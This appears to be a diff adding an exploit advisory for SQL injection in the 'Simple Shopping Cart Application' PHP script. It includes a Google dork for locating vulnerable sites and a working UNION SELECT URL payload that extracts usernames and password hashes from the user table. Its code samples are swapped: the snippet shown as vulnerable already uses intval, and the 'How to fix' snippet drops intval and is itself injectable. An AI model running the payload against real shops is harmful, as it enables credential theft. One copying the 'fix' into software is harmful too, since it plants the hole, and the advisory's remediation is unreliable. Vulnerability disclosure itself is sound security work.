@@ -1,0 +1,51 @@
+# Exploit Title.............. Simple Shopping Cart Application SQL Injection
+# Google Dork................ inurl:"product-details.php?prodid=" "Designed by FBC Students"
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/php/10181/simple-shopping-cart-application-php-mysql.html
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/tyron69/ecommerce_0.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in shop/product-details.php
+-------------------------------
+
+----snip----
+
+	$prodID = intval($_GET['prodid']);
+
+	if(!empty($prodID)){
+		$sqlSelectSpecProd = mysql_query("select * from products where id = '$prodID'") or die(mysql_error());
+		$getProdInfo = mysql_fetch_array($sqlSelectSpecProd);
+		$prodname= $getProdInfo["Product"];
+
+----snip----
+
+
+Example exploitation
+--------------------
+http://server/shop/product-details.php?prodid=-80%27%20union%20select%201,2,concat(username,0x3a,password),4,version(),user()%20from%20user--+
+
+
+How to fix
+----------
+Simple method's use the php function intval.
+For example
+
+	$prodID = $_GET['prodid'];
+
+	if(!empty($prodID)){
+		$sqlSelectSpecProd = mysql_query("select * from products where id = '$prodID'") or die(mysql_error());
+		$getProdInfo = mysql_fetch_array($sqlSelectSpecProd);
+		$prodname= $getProdInfo["Product"];
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/php/10181/simple-shopping-cart-application-php-mysql.html
+http://php.net/manual/en/function.intval.php
